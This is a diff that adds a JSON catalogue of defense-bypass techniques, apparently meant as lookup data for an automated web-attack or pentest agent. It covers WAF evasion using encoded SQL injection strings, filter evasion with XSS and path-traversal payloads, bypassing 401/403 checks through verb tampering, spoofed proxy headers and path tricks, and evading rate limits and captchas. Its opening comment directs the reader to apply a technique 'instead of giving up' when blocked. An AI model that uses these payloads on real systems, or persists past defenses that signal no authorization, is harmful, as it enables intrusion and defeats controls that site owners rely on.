@@ -1,0 +1,54 @@
+{
+  "_comment": "Bypass techniques for when a probe is blocked by a defense (WAF, filter/sanitizer, auth gate, rate-limit). Look up the matching defense and apply the technique instead of giving up.",
+  "categories": [
+    {
+      "id": "waf",
+      "defense": "WAF / web application firewall",
+      "techniques": [
+        {"id": "encoding", "name": "Encoding", "how": "URL-encode, double-encode, or unicode-escape the payload so the signature never matches.", "example": "%2527%2520OR%25201%253D1"},
+        {"id": "case", "name": "Case variation", "how": "Alternate keyword case to evade case-sensitive signatures.", "example": "SeLeCt * FrOm users"},
+        {"id": "comment", "name": "Inline comments", "how": "Insert inline comments inside keywords to split the signature.", "example": "UN/**/ION SE/**/LECT"},
+        {"id": "separator", "name": "Separator variation", "how": "Swap spaces for tabs/newlines/alternative separators.", "example": "SELECT%0a*%0aFROM"},
+        {"id": "concat", "name": "String concatenation", "how": "Break the payload into concatenated fragments.", "example": "se'||'lect"},
+        {"id": "chunked", "name": "Chunked / HTTP smuggling", "how": "Split the payload across chunked-encoding or HTTP/2 boundaries to bypass inspection."},
+        {"id": "param_pollution", "name": "Parameter pollution", "how": "Send duplicate parameters; the WAF checks one, the app uses the other.", "example": "id=1&id=1' OR '1'='1"}
+      ]
+    },
+    {
+      "id": "filter",
+      "defense": "Input filter / sanitizer / blacklist",
+      "techniques": [
+        {"id": "null_byte", "name": "Null byte", "how": "Insert a null byte to truncate validation while the sink reads past it.", "example": "file.php%00.jpg"},
+        {"id": "double_encode", "name": "Double encoding", "how": "Encode twice; the filter decodes once, the sink decodes again.", "example": "%252e%252e%252f"},
+        {"id": "unicode", "name": "Unicode / normalization", "how": "Use fullwidth, overlong UTF-8, or unicode lookalikes the filter misses.", "example": "＜script＞ or %c0%af"},
+        {"id": "case_mix", "name": "Case mixing", "how": "Bypass blacklists with mixed case when the filter is case-sensitive.", "example": "<ScRiPt>"},
+        {"id": "whitespace", "name": "Whitespace / padding", "how": "Insert spaces/tabs/newlines the filter strips or ignores.", "example": "<scr ipt>"},
+        {"id": "nested", "name": "Nested / recursive", "how": "Nest a blocked token inside an allowed one so the filter strips one layer.", "example": "<scr<script>ipt>"},
+        {"id": "cast_truncate", "name": "Cast / length truncation", "how": "Exploit int cast or length truncation that drops the dangerous tail.", "example": "1e99 (loose comparison to 1)"}
+      ]
+    },
+    {
+      "id": "auth",
+      "defense": "Authentication / authorization (401/403)",
+      "techniques": [
+        {"id": "verb", "name": "HTTP verb tampering", "how": "Switch the method (GET->POST) or fuzz uncommon verbs (TRACE, HEAD, OPTIONS, PATCH, INVENTED, HACK) + X-HTTP-Method-Override.", "example": "GET /admin -> POST /admin; X-HTTP-Method-Override: PUT"},
+        {"id": "header", "name": "Proxy header spoofing", "how": "Spoof a proxy-origin header to appear internal/localhost; each proxy honors a different one.", "example": "X-Originating-IP, X-Forwarded-For, X-Forwarded, Forwarded-For, X-Remote-IP, X-Remote-Addr, X-ProxyUser-Ip, Client-IP, True-Client-IP, Cluster-Client-IP, Host: localhost, X-Original-URL: /admin, X-Rewrite-URL: /admin"},
+        {"id": "path_normalize", "name": "Path normalization", "how": "Bypass path-based ACL with traversal, encoding, case, suffix, or separator tricks.", "example": "/%2e/admin, /%252e/admin, //admin//, /./admin/.., /;/admin, /.;/admin, /Admin, /admin/., /admin.json, /admin%ef%bc%8f"},
+        {"id": "api_version", "name": "API version confusion", "how": "Hit a legacy or different API version that lacks the authorization check.", "example": "/v3/users/1234 -> /v1/users/1234"},
+        {"id": "param", "name": "Parameter override / pollution", "how": "Override auth via a second param, or pollute a JSON field with a duplicate key.", "example": "user=guest&user=admin; {\"user_id\":\"legit\",\"user_id\":\"victim\"}; id=111 -> id=[111] -> id={\"id\":111}"},
+        {"id": "proto", "name": "Protocol / host confusion", "how": "Switch http<->https, drop the Host header, or contact the origin IP/CNAME directly.", "example": "https://host -> http://host; remove Host header; resolve CNAME to origin"}
+      ]
+    },
+    {
+      "id": "rate_limit",
+      "defense": "Rate limit / captcha / bot protection",
+      "techniques": [
+        {"id": "rotation", "name": "IP / header rotation", "how": "Rotate source IP or spoof client headers to evade per-IP limits.", "example": "X-Forwarded-For: 1.2.3.4"},
+        {"id": "slow", "name": "Low-and-slow", "how": "Stay under the threshold with pacing + jitter."},
+        {"id": "header_spoof", "name": "Header spoofing", "how": "Spoof User-Agent / Referer to look like a real browser."},
+        {"id": "token_reuse", "name": "Token/session reuse", "how": "Reuse a valid session/token across requests to skip per-request checks."},
+        {"id": "burst", "name": "Burst vs window", "how": "Exploit the difference between per-second and per-window limits."}
+      ]
+    }
+  ]
+}
